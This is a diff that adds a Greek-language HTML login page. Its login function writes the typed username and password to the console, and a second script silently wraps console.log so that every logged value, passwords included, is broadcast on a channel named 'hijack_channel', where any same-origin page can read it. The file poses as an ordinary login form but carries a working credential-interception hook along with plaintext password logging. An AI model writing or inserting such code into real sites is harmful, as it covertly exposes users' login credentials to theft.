@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+</head>
+
+<body>
+  <div class="box">
+      <h3> Είσοδος Χρήστη</h3>
+      <p>Συμπλήρωσε τα στοιχεία σου:</p>
+      <input type="text" id="username" placeholder="Όνομα χρήστη">
+      <input type="password" id="password" placeholder="Κωδικός πρόσβασης">
+      <button onclick="loginUser()">Σύνδεση</button>
+    </div>
+
+    <script>
+      function loginUser() {
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+
+        console.log("Νέα σύνδεση:", { user, pass });
+        alert("Καλώς ήρθες " + user + "!");
+      }
+    </script>
+
+    <script>
+      const spyChannel = new BroadcastChannel('hijack_channel');
+      const realLog = console.log;
+
+      console.log = function(...args) {
+        spyChannel.postMessage(args);
+
+        realLog.apply(console, args);
+      };
+    </script>
+
+  </body>
+  </html>
